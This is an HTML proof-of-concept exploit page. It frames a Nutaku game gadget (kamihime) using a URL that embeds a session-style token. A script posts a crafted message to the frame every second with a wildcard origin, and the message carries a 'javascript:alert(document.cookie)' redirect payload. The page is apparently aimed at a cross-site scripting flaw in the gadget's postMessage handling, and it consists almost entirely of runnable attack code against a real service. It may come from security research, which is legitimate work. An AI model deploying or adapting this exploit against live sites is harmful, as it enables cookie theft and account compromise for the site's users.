<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Immediate postMessage via iframe</title>
</head>
<body>
  <iframe id="targetFrame" 
          src="https://osapi.nutaku.com/gadgets/ifr?synd=nutaku&container=nutaku&country=US&lang=en&mid=1&owner=173250875&viewer=173250875&aid=70059&tid=kamihime&view=canvas&parent=https%3A%2F%2Fwww.nutaku.com&noinfo=0&nocache=0&debug=1&view-params=&st=xfR1MA7FALTHf6cy5ZQX2OPUfuUOC6CbJstMje2h%2Fg3PhFS1iaiRzJD8daQr9nfXc1sC5cLyhsF%2F46W7d4N5Y%2FbwBAhQMZMyDgfmUYRVCXlD2NKuQOLiIN0Vb3ss9DyyBHPdORwKs9fSLbWL9Oux9xaRZ2g4fqnZNSVh5Cxvw8GC40bU1mQhyi1up7M%2F0evMTpscjJw%2B2xGUj2HeSH7OXgngym%2FTPmZzu8n42sDKpRGgCgIQ9v3TMEROJB3Ib2AgqkHvuA%3D%3D&domain=https%3A%2F%2Fwww.nutaku.com" 
          style="width:900px; height:700px; border:1px solid #ccc;"></iframe>

  <script>
    const iframe = document.getElementById('targetFrame');
    const payload = JSON.stringify(["redirectURL", ["javascript:alert(document.cookie)"], "paymentResponse"]);
    const INTERVAL_MS = 1000;

    let sendIntervalId = null;

    // Function to send message
    function sendMessage() {
      if (!iframe.contentWindow) {
        console.warn('iframe not ready yet');
        return;
      }

      try {
        iframe.contentWindow.postMessage(payload, "*");
        console.log('posted:', payload);
      } catch (err) {
        console.error('postMessage error:', err);
      }
    }

    // Immediately attempt once
    sendMessage();

    // Repeat sending every second
    sendIntervalId = setInterval(sendMessage, INTERVAL_MS);

    // Cleanup on navigation
    window.addEventListener('beforeunload', () => {
      if (sendIntervalId) clearInterval(sendIntervalId);
    });
  </script>
</body>
</html>
